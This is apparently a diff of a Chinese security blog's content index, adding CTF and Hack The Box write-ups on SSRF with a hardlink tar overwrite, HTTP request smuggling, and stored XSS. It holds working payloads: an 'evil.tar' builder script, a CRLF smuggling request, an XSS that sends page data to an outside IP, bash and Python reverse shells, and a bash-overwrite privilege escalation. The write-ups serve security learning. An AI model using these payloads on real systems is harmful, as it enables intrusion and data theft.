@@ -50,6 +50,222 @@ hashcat爆破：hashcat -m 18200 hash.txt rockyou.txt
       </tags>
   </entry>
   <entry>
+    <title>mlops - URL解析差异SSRF + hardlink恢复缺陷 + 配置文件注入</title>
+    <url>/2026/08/14/ctf-mlops-ssrf-hardlink/</url>
+    <content><![CDATA[看源码，找api&#x2F;api&#x2F;health 状态
+&#x2F;api&#x2F;import  url参数上传host, 只允许 http/https并有 allowed.com  限制，还有2次DNS检查（第一次： 看这个域名当前解析到哪些 IP  ，第二次： 50ms 后再解析一次同一个域名与第一次对比）
+&#x2F;api&#x2F;upload file参数文件上传， 生成一个 12 位随机 file_id，保存成 /app/uploads/&lt;file_id&gt;.tar，并返回file_id
+&#x2F;admin&#x2F;backup&#x2F;restore  根据 file_id把文件解压修复，需要admin权限，解压时还要检查tar不能存在python可执行物
+&#x2F;admin&#x2F;runner&#x2F;start 管理员会生成一个dataset映射生成一个&#x2F;data&#x2F;imports&#x2F;.csv文件，后台执行worker.py会读取这个表格
+FLAG_PATH &#x3D; Path(“&#x2F;flag”)
+整体的代码逻辑&#x2F;api&#x2F;import  url参数上传host, 只允许 http/https并有限制 allowed.com  ，还有2次DNS检查
+if parsed.host != ALLOWED_HOST: # 必须恰好等于 &quot;allowed.com&quot;     return 403
+
+
+
+用户通过&#x2F;api&#x2F;upload上传tar压缩包，tar被存到&#x2F;app&#x2F;uploads&#x2F;.tar
+管理员调用/admin/backup/restore检验tar后解压恢复到/tmp/restore
+管理员调动/admin/runner/start执行任务， worker 读取 /data/imports/&lt;dataset&gt;.csv并生成报告
+漏洞点：
+url 可控，是一个 **SSRF 入口面，**2次DNS检查-&gt;DNS重绑定
+上传的 tar 可控，是一个 文件恢复&#x2F;解包攻击面
+admin 接口的来源校验很弱，是一个 权限边界面
+worker.py 里有 shell=True 的 hook，是一个 最终执行面
+
+攻击思路：
+绕过url检测
+用 SSRF 打 admin 接口
+上传恶意 tar 包
+调用 restore 解压写文件
+调用 runner 触发执行
+拿 flag
+
+1. URL 解析差异  ssrf因为检查那是url必须等于allowed.com，但是allowed.com不可控
+
+
+URL：http://allowed.com\@127.0.0.1：8000/
+
+
+
+
+
+解析器
+认为的 host
+结果
+
+
+
+urllib3（检查用）
+allowed.com
+✅ 通过检查
+
+
+httpx（实际请求用）
+127.0.0.1
+🎯 打内网
+
+
+原理：
+
+urllib3 把 allowed.com\@127.0.0.1 当成一整个 host 字符串
+httpx 把反斜杠 \ 当成分隔符，认为 @ 后面的 127.0.0.1 才是真正的 host
+
+2.上传恶意tar怎么上传：通过&#x2F;api&#x2F;upload&#x2F;接口
+上传什么：
+因为worker要读取 /data/imports/&lt;dataset&gt;.csv才能生成报告，所以我们就要先写一个合法的.csv文件， worker 启动时默认读的是&#x2F;data&#x2F;imports&#x2F;latest.csv
+
+
+ok,有了合法的csv的文件之后，worker.py文件可以执行了，然后在worker.py文件里，worker 会读 model-registry.json，从里面找当前baseline-logistic-regression模型对应的配置，看配置里有没有 warmup，所以如果我们把它改成：
+&#123;  &quot;baseline-logistic-regression&quot;: &#123;    &quot;family&quot;: &quot;linear&quot;,    &quot;warmup&quot;: &quot;cp /flag /app/static/reports/pwn.txt&quot;  &#125;&#125;
+
+那么 worker 启动这个模型时，就会执行这条命令
+
+
+补充一下为什么可以代码执行：
+我们通过恢复逻辑覆盖了 worker 会读取的 model-registry.json，从而控制了 warmup hook 的内容；
+而 warmup hook 最终被 subprocess.run(…, shell&#x3D;True) 执行，因此形成命令执行。
+这里还用到了一个： hardlink 恢复缺陷 
+因为在tar里构造name = pivot-reg但是type = hardlink``linkname = /app/static/model-registry.json，程序会觉得：“我要解压的是 /tmp/restore/pivot-reg，没出界”
+但实际上这个 pivot-reg 已经连到了：&#x2F;app&#x2F;static&#x2F;model-registry.json。
+所以后面你再放一个同名普通文件pivot-reg，解压器会往 /tmp/restore/pivot-reg 写内容，而这个路径已经通过 hardlink 连到外部目标，所以最后被改写的是：&#x2F;app&#x2F;static&#x2F;model-registry.json
+总之：构造一个合法的csv文件，然后覆盖model-registry.json文件，改baseline-logistic-regression模型对应的配置改成把flag内容复制到输出的报告的路径下的任意文件
+
+核心思路是两组成员，名字都相同：
+
+一个 hardlink 成员
+名字比如 pivot-reg
+linkname 指向外部目标，例如 /app/static/model-registry.json
+
+
+一个同名普通文件 pivot-reg
+内容就是你想写进 /app/static/model-registry.json 的 JSON
+
+
+
+如果还要同时造数据集，再来一组：
+
+pivot-csv -&gt; hardlink 到 /data/imports/latest.csv
+同名普通文件 pivot-csv
+内容是合法 CSV
+
+
+
+
+import ioimport jsonimport tarfiledef add_hardlink_then_file(tar: tarfile.TarFile, name: str, target: str, data: bytes) -&gt; None:    # 中文注释：先添加一个硬链接成员，名字在恢复目录内，目标指向外部文件，就是/app/static/model-registry.json    link = tarfile.TarInfo(name)    link.type = tarfile.LNKTYPE    link.linkname = target    tar.addfile(link)    # 中文注释：再添加一个同名普通文件，解压时会通过硬链接覆盖外部目标内容    reg = tarfile.TarInfo(name)    reg.size = len(data)    tar.addfile(reg, io.BytesIO(data))def build_evil_tar(output_path: str) -&gt; None:    # 中文注释：这里写你希望 worker 读取到的模型注册表内容    model_registry = &#123;        &quot;baseline-logistic-regression&quot;: &#123;            &quot;family&quot;: &quot;linear&quot;,            &quot;warmup&quot;: &quot;cp /flag /app/static/reports/pwn.txt&quot;        &#125;    &#125;    model_registry_bytes = json.dumps(model_registry).encode(&quot;utf-8&quot;)    # 中文注释：这里写一个最小合法 CSV，供 worker 读取 latest.csv    csv_bytes = b&quot;f1,label\n1,1\n2,0\n&quot;    with tarfile.open(output_path, &quot;w&quot;) as tar:        # 中文注释：覆盖模型注册表        add_hardlink_then_file(            tar,            name=&quot;pivot-reg&quot;,            target=&quot;/app/static/model-registry.json&quot;,            data=model_registry_bytes,        )        # 中文注释：覆盖数据集文件        add_hardlink_then_file(            tar,            name=&quot;pivot-csv&quot;,            target=&quot;/data/imports/latest.csv&quot;,            data=csv_bytes,        )if __name__ == &quot;__main__&quot;:    # 中文注释：生成最终要上传的恶意 tar    build_evil_tar(&quot;evil.tar&quot;)
+
+上传方法：****
+cd /d C:\Users\HP\Desktopcurl -X POST &quot;http://127.0.0.1:8000/api/upload&quot; -F &quot;file=@evil.tar&quot;
+
+
+
+“file_id”:”6bdd27fb5fb8”
+3.调用 restore 解压写文件（利用admin的api解压上车的恶意tar）http://localhost:8000/api/import?url=http://allowed.com\@127.0.0.1:8000/admin/backup/restore?file_id=6bdd27fb5fb8
+
+
+
+4.调用 runner 触发执行(运行解压的文件）http://localhost:8000/api/import?url=http://allowed.com\@127.0.0.1:8000/admin/runner/start
+
+
+
+5.拿 flag（访问输出的报告目录下的转载flag文件）/static/reports/pwn.txt
+
+
+
+]]></content>
+      <categories>
+        <category>CTF wp</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>SSRF</tag>
+        <tag>hardlink</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>go to php - HTTP 请求走私</title>
+    <url>/2026/08/14/ctf-go-to-php-http-smuggling/</url>
+    <content><![CDATA[index.php看源码：
+
+
+RequestVenom 直接把用户控制的 path 拼接到固定的内部地址 http://localhost:8080，然后用 file_get_contents 发起请求
+lib.php
+
+
+接收CTF2026请求的内容，并url解码拼接进 HTTP header，pash中过滤了flag
+go.go
+
+
+&#x2F;write路径可以写入文件，需要name和path两个参数，但是如果参数不对就会显示bad note
+所以利用HTTP请求走私，同时向go发送两个请求，都带有相同的X-Trace编号，使解析为name&#x3D;AAA&amp;path&#x3D;z.txt是合法的，同时请求flag也带有授权 T1，被视为合法，即可返回 flag
+所以：
+外层请求:  /?path=/write?name=AAA%26path=z.txt                     + ctf2026 头走私 /flag                     ↓PHP 的 $path     = /write?name=AAA&amp;path=z.txt                     ↓PHP 发去 Go      = http://localhost:8080/write?name=AAA&amp;path=z.txt                     ↓Go 解析出两个请求:   ① GET /write?name=AAA&amp;path=z.txt  (X-Trace: T1)      → name=AAA 非空 ✓, path=z.txt 合法 ✓      → writeAndGrant → 授权 T1   ② GET /flag (X-Trace: T1)      → grants[T1] 命中 → 返回 flag
+
+payload:
+GET /?path=/write?name=AAA%26path=z.txtCTF2026: a%0d%0aHost:%20localhost:8080%0d%0aX-Trace:%20T1%0d%0a%0d%0aGET%20/flag%20HTTP/1.1%0d%0aHost:%20localhost:8080%0d%0aX-Trace:%20T1
+
+请求头** CRLF 注入**$header 来自我们请求的 HTTP_CTF2026 头，而 urldecode 能把 %0d%0a 变成真实的 **\r\n**，%0d%0a就是\r\n的url编码，所以payload解析就是：
+GET /write?name=AAA&amp;path=z.txt HTTP/1.1    ctf2026: a                                 Host: localhost:8080                      X-Trace: T1                                                                     GET /flag HTTP/1.1                         Host: localhost:8080                     X-Trace: T1                            Connection: keep-alive
+
+
+
+]]></content>
+      <categories>
+        <category>CTF wp</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>HTTP请求走私</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>存储型 XSS 注入 + Admin Bot 提权 + XSS 外带</title>
+    <url>/2026/08/14/ctf-stored-xss-admin-bot/</url>
+    <content><![CDATA[拿到源码先看什么？1.app.py: 先把所有路由列出来，搞清楚网站有什么功能2.找漏洞： view_encoding.html  ：
+&lt;div class=&quot;subtitle&quot;&gt;&#123;&#123;encoding|safe&#125;&#125;&lt;/div&gt;
+
+|safe &#x3D; 不过滤直接输出。这是一个 sink。问题是：它输出的 encoding 里有什么我们可控？
+3.确认注入点：整体的逻辑：发送信息，经过base91编码，在&#x2F;s&#x2F;sid 路径下回显发送的内容，回显包括经过base91编码的内容和注册时设置的用户名
+&#x2F;s&#x2F; 路由里：
+signal = read_signal(sid, session.get(&quot;callsign&quot;))return render_template(&quot;view_encoding.html&quot;, encoding=signal)
+
+signal 是一个 dict：{“text”: base91密文, “creator”: 笔记owner}。
+Jinja2 渲染一个 dict 时会调用 str(dict)，输出它的 repr：{‘text’: ‘AbC…’, ‘creator’: ‘admin’}
+所以页面 HTML 实际长这样。而|safe保证尖括号原样渲染。
+注意：repr 自动转义引号和反斜杠creator 就是我们注册时的用户名，原样进 dict repr，原样进 HTML。
+所以注入点不在 text，在 username
+4.bot:  alienbot.js经验：CTF Web 题里，只要出现 bot、puppeteer、headless、chromium 这类关键词，99% 考 XSS。因为 bot 的作用就是模拟管理员访问页面，触发你的 XSS。  
+**外带 **&#x3D; 让 bot 的浏览器（在 admin 会话里）主动把读到的 flag 数据，当成一个”请求”发到你自己的服务器上。
+5.构造payload先定目标：XSS 在 admin 会话里要做什么
+拿 admin 的 dashboard → 里面有 flag 的 sid
+请求 &#x2F;s&#x2F; → 读到 flag（base91 密文）
+把内容发到我的服务器（外带）
+注册时username为:
+&lt;script&gt;fetch(&quot;/&quot;).then(r=&gt;r.text()).then(h=&gt;&#123;let s=h.split(&quot;/s/&quot;)[1].substring(0,40);fetch(&quot;/s/&quot;+s).then(r=&gt;r.text()).then(t=&gt;&#123;new Image().src=&quot;http://120.53.249.234:8080/?d=&quot;+encodeURIComponent(t);&#125;);&#125;);&lt;/script&gt;
+
+评论区的payload：（逆向思维-&gt;91编码）
+f0ef71053aa76696f8f6d7ea80d74bcf03fa874e059795971fc18afbf221fa6b0503f7fa1b7ee854705979f9110cb9a75607bc5e7abefd01fad888e87fdd0e23f32318497fe8408c323b7afedb61c66aafffca170a861f3a155c565e7e042beecb87e8af150cdceb6ff8a153c165e5e54770e4ae6b1c2a036a39c30dc158e09de6d19f1153bad58799ac3c2bac44d1861e5e81a856f77ebd301ca6e000
+
+解析：
+fetch(&quot;/&quot;)                                   // ① admin 身份拿 dashboard  .then(r =&gt; r.text())                       // ② 读 HTML 文本  .then(h =&gt; &#123;                               // ③ 从 HTML 里抠出 flag 的 sid    let s = h.split(&quot;/s/&quot;)[1].substring(0,40);    fetch(&quot;/s/&quot; + s).then(r =&gt; r.text())     // ④ 读 flag 页面      .then(t =&gt; &#123;        new Image().src = &quot;http://120.53.249.234:8080/?d=&quot; + encodeURIComponent(t);  // ⑤ 外带      &#125;);  &#125;); 
+
+服务器监听：python3 -m http.server 8080
+
+
+url解码
+
+
+带出整个页面，得到flag
+]]></content>
+      <categories>
+        <category>CTF wp</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>XSS</tag>
+        <tag>Admin Bot</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB Conversor 靶场 Writeup</title>
     <url>/2026/08/14/htb-conversor/</url>
     <content><![CDATA[Nmapnmap -sV 10.129.238.31
@@ -164,156 +380,6 @@ system执行命令，给&#x2F;bin&#x2F;bash加上root权限
         <tag>HTB</tag>
         <tag>Conversor</tag>
         <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB DevArea 靶场 Writeup</title>
-    <url>/2026/08/14/htb-devarea/</url>
-    <content><![CDATA[DevAreanmapnmap -sS -sV 10.129.116.255
-
-
-PORT     STATE SERVICE VERSION21&#x2F;tcp   open  ftp     vsftpd 3.0.5       文件传输服务22&#x2F;tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)    远程登录80&#x2F;tcp   open  http    Apache httpd 2.4.58        web服务器8080&#x2F;tcp open  http    Jetty 9.4.27.v20200227      Jatty容器8500&#x2F;tcp open  http    Golang net&#x2F;http server    代理服务器go写的8888&#x2F;tcp open  http    Golang net&#x2F;http server (Go-IPFS json-rpc or InfluxDB API)  go写的API &#x2F; 面板 &#x2F; 调试服务 &#x2F; 数据服务
-devArea.htb
-echo &quot;10.129.116.255 devArea.htb&quot; | sudo tee -a /etc/hosts
-
-访问，是一个网站
-
-但是右上角的login和register进不了，扫目录
-ffuf -c -u &#x27;http://devArea.htb/FUZZ&#x27; \-w ~/SecLists/Discovery/Web-Content/common.txt
-
-没扫到
-21： ftp  vsftpd 3.0.5   文件传输服务hydra爆破一下用户名和密码
-hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 6 -e ns ftp://10.129.116.255 -V
-
-
-匿名 FTP 连接：交互式登录，用户名是anonymous，没有密码
-ftp 10.129.207.190 21
-
-
-信息收集：
-
-找到目录pub
-
-发现一个jar包，get下载一下
-jadx打开：
-
-访问:8080&#x2F;employeeservice和:8080&#x2F;employeeservice?wsdl
-
-
-?wsdl 能访问这说明 8080 上确实是 SOAP Web Service，而且 WSDL 公开可读
-WSDL 里关键信息是：
-
-服务名：EmployeeServiceService
-端口名：EmployeeServicePort
-方法名：submitReport
-目标命名空间：http://devarea.htb/
-实际端点：http://10.129.116.255:8080/employeeservice
-
-但直接 GET /employeeservice 返回 500，说明访问到了 SOAP 端点，但没有按 SOAP 格式发请求
-发一个 POST 到：
-http://10.129.116.255:8080/employeeservice
-
-请求头：
-Content-Type: text/xml; charset=utf-8SOAPAction: &quot;&quot;
-
-请求体可以先用这个最小合法包：
-&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:dev=&quot;http://devarea.htb/&quot;&gt;  &lt;soapenv:Header/&gt;  &lt;soapenv:Body&gt;    &lt;dev:submitReport&gt;      &lt;arg0&gt;        &lt;confidential&gt;false&lt;/confidential&gt;        &lt;content&gt;test&lt;/content&gt;        &lt;department&gt;IT&lt;/department&gt;        &lt;employeeName&gt;echoin&lt;/employeeName&gt;      &lt;/arg0&gt;    &lt;/dev:submitReport&gt;  &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;
-
-
-说明可以利用，找一下SOAP Web Service的漏洞
-SOAP Web Service的漏洞利用
-在渗透测试中，available SOAP services 通常通过访问 ?wsdl 暴露接口信息，攻击者可利用这些接口进行漏洞探测与利用。例如，访问 http://target.com/service.asmx?wsdl 获取接口定义后，可构造恶意SOAP请求触发漏洞。
-SOAP协议安全攻防录-先知社区
-
-相关利用有xss,xxe,ssrf,sql，xss和xxe都试了，sql的话源码里没有数据库信息，所以ssrf,找一下cve
-利用 Apache CXF SSRF 漏洞 (CVE-2022-46364)poc:kasem545&#x2F;CVE-2022-46364-Poc: CVE-2022-46364-Poc Apache CXF SSRF via MTOM XOP:Include
-
-可以读取etc&#x2F;passwd
-
-root用户：dev_ryan
-用户：syswatch
-
-当前主机名devarea
-直接读root用户dev_ryan
-
-找到：syswatch-v1.zip和user.txt
-但是user.txt没有读取权限，可能要拿到shell才能看，但是syswatch-v1.zip可读
-syswatch-v1.zip读取到很多syswatch相关内容。但是乱码，还原一下：
-这个exp脚本有个弊端，就是终端无法完整的显示base64，还原代码比较麻烦，所以改一下脚本，
-
-改完之后得到完整base64
-cat &gt; /tmp/syswatch.b64 &lt;&lt;&#x27;EOF&#x27;base64内容EOF
-
-还原 zip
-base64 -d /tmp/syswatch.b64 &gt; syswatch-v1.zipfile syswatch-v1.zipunzip -l syswatch-v1.zip | head -n 50
-
-
-解压
-mkdir -p /tmp/syswatch-srcunzip syswatch-v1.zip -d /tmp/syswatch-src
-
-
-现在思路。审这个代码，找漏洞点，目的连shell
-初步判断，这个zip是这个网站的源码
-
-找到admin的password_hash: scrypt:32768:8:1$IyKfaiteB3TNFK6Hv$a0fbf5283db6a13859776827133e99d4d5ab43e85bedd05b06119e6fdca096ac81570d4497a836d09a155884182b6442cfcf6986b96310b514f34d9da871cb70
-在setup.sh:
- &#x2F;etc&#x2F;syswatch.env文件里写入：SYSWATCH_SECRET_KEY和SYSWATCH_ADMIN_PASSWORD
-默认密码是SyswatchAdmin2026
-权限是755,可读
-
-读取 &#x2F;etc&#x2F;syswatch.env文件
-
-得到：
-SYSWATCH_SECRET_KEY&#x3D;f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725SYSWATCH_ADMIN_PASSWORD&#x3D;SyswatchAdmin2026
-但是无法利用去登录用户，这里看wp 说这个主机上跑的Hoverfly 服务，对应8888端口，在源码的confg的文件里也有提到，所以读取一下系统文件&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;hoverfly.service
-
-得到：
-User&#x3D;dev_ryanGroup&#x3D;dev_ryanWorkingDirectory&#x3D;&#x2F;opt&#x2F;HoverFlyExecStart&#x3D;&#x2F;opt&#x2F;HoverFly&#x2F;hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
-Hoverfly API利用
-Hoverfly是一个轻量的API服务模拟工具
-
-使用提取的凭据对 Hoverfly API 进行身份验证，并获取访问令牌
-
-admin  O7IJ27MyyXiU  登录
-
-获取JWT  token
-
-eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYwNjk3ODAsImlhdCI6MTc3NTAyOTc4MCwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.S8b2IMAW6f8Thm7eFXz0Ul0JrxYeUBRt-5rBpAFL1QaRSsvJmg16Ov4B6DMZ5TZSXd1DxjHkSTCzf-fUar6bsQ
-
-Hoverfly远程代码执行 CVE-2025-54123poc:kasem545&#x2F;CVE-2025-54123-Poc：CVE-2025-54123 Hoverfly 认证中间件命令注入 RCE
-python3 cve-2025-54123.py -t http://10.129.207.190:8888 -u admin -p O7IJ27MyyXiU -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.23/1234 0&gt;&amp;1&quot;
-
-
-拿到shell
-
-flag 1:d22ae9c06aeaaa8ccaba6fea2bb98067
-提权sudo -l
-
-说明可以利用syswatch&#x2F;syswatch.sh执行root命令,
-&#x2F;bin&#x2F;bash可编写，并通过 Sudo 以 root 方式运行——当 syswatch 执行时，它会内部调用，这意味着我们可以用恶意脚本替代 bash
-
-以下复现：HackTheBox Season 10 DevArea 难度:Medium - 信息安全知识库
-备份 bash + 创建 payload（当前shell中执行）cp /usr/bin/bash /tmp/bash.bakcat &gt; /tmp/payload.sh &lt;&lt; &#x27;EOF&#x27;#!/tmp/bash.bak                      //用 /tmp/bash.bak 来解释执行cat /root/root.txt &gt; /tmp/root.txt   //把flag写入了/tmp/root.txtchmod 777 /tmp/root.txtcp /tmp/bash.bak /tmp/rootbashchmod +s /tmp/rootbashcp /tmp/bash.bak /usr/bin/bashexec /tmp/bash.bak &quot;$@&quot;              //用真正的 bash 执行当前收到的原始参数，并用它替换当前进程EOFchmod +x /tmp/payload.sh
-
-&lt;&lt; &#39;EOF&#39;带单引号，表示不要在当前 shell 里展开变量、命令替换，完全原样写入文件
-连接第二个shellpython3 -c &quot;import socket,subprocess,os;s=socket.socket();s.connect((&#x27;10.10.16.23&#x27;,9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#x27;/bin/dash&#x27;,&#x27;-i&#x27;])&quot;
-
-监听：
-nc -lvnp 9002
-
-执行权限提升kill -9 $(pgrep -x bash) 2&gt;/dev/null      //先杀所有 bash 进程，然后才执行为了释放对 bash 的占用dd if=/tmp/payload.sh of=/usr/bin/bash    //dd:直接把payload字节写进目标文件sudo /opt/syswatch/syswatch.sh --version  //以root执行payload.shcat /tmp/root.txt
-
-虽然 whoami 还显示 dev_ryan，但 payload 已经成功以 root 身份执行并把 flag 写入了 /tmp/root.txt
-
-flag 2:33691ecec0ac0214836b4dbe565bed87
-]]></content>
-      <categories>
-        <category>靶场</category>
-      </categories>
-      <tags>
-        <tag>HTB</tag>
-        <tag>靶场</tag>
-        <tag>DevArea</tag>
       </tags>
   </entry>
   <entry>
@@ -1325,116 +1391,145 @@ flag23:DANTE{Bad_pr4ct1ces_Thru_strncmp}
       </tags>
   </entry>
   <entry>
-    <title>HTB Kobold 靶场 Writeup</title>
-    <url>/2026/08/14/htb-kobold/</url>
-    <content><![CDATA[Nmapnmap -sV 10.129.127.169 -A
+    <title>HTB DevArea 靶场 Writeup</title>
+    <url>/2026/08/14/htb-devarea/</url>
+    <content><![CDATA[DevAreanmapnmap -sS -sV 10.129.116.255
 
 
+PORT     STATE SERVICE VERSION21&#x2F;tcp   open  ftp     vsftpd 3.0.5       文件传输服务22&#x2F;tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)    远程登录80&#x2F;tcp   open  http    Apache httpd 2.4.58        web服务器8080&#x2F;tcp open  http    Jetty 9.4.27.v20200227      Jatty容器8500&#x2F;tcp open  http    Golang net&#x2F;http server    代理服务器go写的8888&#x2F;tcp open  http    Golang net&#x2F;http server (Go-IPFS json-rpc or InfluxDB API)  go写的API &#x2F; 面板 &#x2F; 调试服务 &#x2F; 数据服务
+devArea.htb
+echo &quot;10.129.116.255 devArea.htb&quot; | sudo tee -a /etc/hosts
 
-3个开放端口：SSH （22）、HTTP（80，重定向为HTTPS）、HTTPS （443）
-Ubuntu 上的 nginx 1.24.0
-通配符TLS证书——表示带有子域名的虚拟主机路由*.kobold.htb
-80号端口重定向至https://kobold.htb/
+访问，是一个网站
 
-(将机器主机名添加到本地主机文件中：
-echo &quot;10.129.127.169 kobold.htb mcp.kobold.htb bin.kobold.htb&quot; | sudo tee -a /etc/hosts
+但是右上角的login和register进不了，扫目录
+ffuf -c -u &#x27;http://devArea.htb/FUZZ&#x27; \-w ~/SecLists/Discovery/Web-Content/common.txt
 
-10.129.245.50   (一开始因为是https,所以证书不受信任，在 Firefox 里点 Advanced 后继续访问)
-
-子域枚举ffuf -c -k -u &#x27;https://10.129.127.169/&#x27; \-H &#x27;Host: FUZZ.target.htb&#x27; \-w ~/SecLists/Discovery/DNS/combined_subdomains.txt \-ac
-
-发现了两个子领域：mcp.kobold.htb—— MCP Jam
-
-再全面扫一下端口：
-nmap -Pn -p- --min-rate 3000 -T4 kobold.htb
+没扫到
+21： ftp  vsftpd 3.0.5   文件传输服务hydra爆破一下用户名和密码
+hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 6 -e ns ftp://10.129.116.255 -V
 
 
-发现还有一个3552端口
-但是直接访问 https://kobold.htb:3552/ 访问不了,但是http:&#x2F;&#x2F; 可以
-进入了一个登录页面
+匿名 FTP 连接：交互式登录，用户名是anonymous，没有密码
+ftp 10.129.207.190 21
 
-Arcane 1.13.0
-但是没有用户名和密码，登录不了
-CVE-2026-23744还是得再从mcp.kobold.htb —— mcpJam入手：
-cve:CVE-2026-23744
-MCPJam inspector 是一个用于 MCP 服务器的本地优先开发平台。 版本 1.4.2 及更早版本存在远程代码执行（RCE）漏洞，攻击者可通过构造 HTTP 请求触发 MCP 服务器安装流程，从而实现远程代码执行。 MCPJam inspector 默认监听 0.0.0.0，而非仅限本地的 127.0.0.1
-poc:https://github.com/H1sok444/CVE-2026-23744-PoC#cve-2026-23744-poc
-脚本参考：HTB - Kobold-CSDN博客
 
-poc中使用 busybox nc -e /bin/sh 作为回连方式，但这种写法强依赖目标环境中存在 BusyBox 版本的 netcat，且要求其支持 -e 参数。靶场中，这个命令是可以弹shell，但不完整
+信息收集：
 
-运行exp脚本：
+找到目录pub
+
+发现一个jar包，get下载一下
+jadx打开：
+
+访问:8080&#x2F;employeeservice和:8080&#x2F;employeeservice?wsdl
+
+
+?wsdl 能访问这说明 8080 上确实是 SOAP Web Service，而且 WSDL 公开可读
+WSDL 里关键信息是：
+
+服务名：EmployeeServiceService
+端口名：EmployeeServicePort
+方法名：submitReport
+目标命名空间：http://devarea.htb/
+实际端点：http://10.129.116.255:8080/employeeservice
+
+但直接 GET /employeeservice 返回 500，说明访问到了 SOAP 端点，但没有按 SOAP 格式发请求
+发一个 POST 到：
+http://10.129.116.255:8080/employeeservice
+
+请求头：
+Content-Type: text/xml; charset=utf-8SOAPAction: &quot;&quot;
+
+请求体可以先用这个最小合法包：
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:dev=&quot;http://devarea.htb/&quot;&gt;  &lt;soapenv:Header/&gt;  &lt;soapenv:Body&gt;    &lt;dev:submitReport&gt;      &lt;arg0&gt;        &lt;confidential&gt;false&lt;/confidential&gt;        &lt;content&gt;test&lt;/content&gt;        &lt;department&gt;IT&lt;/department&gt;        &lt;employeeName&gt;echoin&lt;/employeeName&gt;      &lt;/arg0&gt;    &lt;/dev:submitReport&gt;  &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;
+
+
+说明可以利用，找一下SOAP Web Service的漏洞
+SOAP Web Service的漏洞利用
+在渗透测试中，available SOAP services 通常通过访问 ?wsdl 暴露接口信息，攻击者可利用这些接口进行漏洞探测与利用。例如，访问 http://target.com/service.asmx?wsdl 获取接口定义后，可构造恶意SOAP请求触发漏洞。
+SOAP协议安全攻防录-先知社区
+
+相关利用有xss,xxe,ssrf,sql，xss和xxe都试了，sql的话源码里没有数据库信息，所以ssrf,找一下cve
+利用 Apache CXF SSRF 漏洞 (CVE-2022-46364)poc:kasem545&#x2F;CVE-2022-46364-Poc: CVE-2022-46364-Poc Apache CXF SSRF via MTOM XOP:Include
+
+可以读取etc&#x2F;passwd
+
+root用户：dev_ryan
+用户：syswatch
+
+当前主机名devarea
+直接读root用户dev_ryan
+
+找到：syswatch-v1.zip和user.txt
+但是user.txt没有读取权限，可能要拿到shell才能看，但是syswatch-v1.zip可读
+syswatch-v1.zip读取到很多syswatch相关内容。但是乱码，还原一下：
+这个exp脚本有个弊端，就是终端无法完整的显示base64，还原代码比较麻烦，所以改一下脚本，
+
+改完之后得到完整base64
+cat &gt; /tmp/syswatch.b64 &lt;&lt;&#x27;EOF&#x27;base64内容EOF
+
+还原 zip
+base64 -d /tmp/syswatch.b64 &gt; syswatch-v1.zipfile syswatch-v1.zipunzip -l syswatch-v1.zip | head -n 50
+
+
+解压
+mkdir -p /tmp/syswatch-srcunzip syswatch-v1.zip -d /tmp/syswatch-src
+
+
+现在思路。审这个代码，找漏洞点，目的连shell
+初步判断，这个zip是这个网站的源码
+
+找到admin的password_hash: scrypt:32768:8:1$IyKfaiteB3TNFK6Hv$a0fbf5283db6a13859776827133e99d4d5ab43e85bedd05b06119e6fdca096ac81570d4497a836d09a155884182b6442cfcf6986b96310b514f34d9da871cb70
+在setup.sh:
+ &#x2F;etc&#x2F;syswatch.env文件里写入：SYSWATCH_SECRET_KEY和SYSWATCH_ADMIN_PASSWORD
+默认密码是SyswatchAdmin2026
+权限是755,可读
+
+读取 &#x2F;etc&#x2F;syswatch.env文件
+
+得到：
+SYSWATCH_SECRET_KEY&#x3D;f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725SYSWATCH_ADMIN_PASSWORD&#x3D;SyswatchAdmin2026
+但是无法利用去登录用户，这里看wp 说这个主机上跑的Hoverfly 服务，对应8888端口，在源码的confg的文件里也有提到，所以读取一下系统文件&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;hoverfly.service
+
+得到：
+User&#x3D;dev_ryanGroup&#x3D;dev_ryanWorkingDirectory&#x3D;&#x2F;opt&#x2F;HoverFlyExecStart&#x3D;&#x2F;opt&#x2F;HoverFly&#x2F;hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
+Hoverfly API利用
+Hoverfly是一个轻量的API服务模拟工具
+
+使用提取的凭据对 Hoverfly API 进行身份验证，并获取访问令牌
+
+admin  O7IJ27MyyXiU  登录
+
+获取JWT  token
+
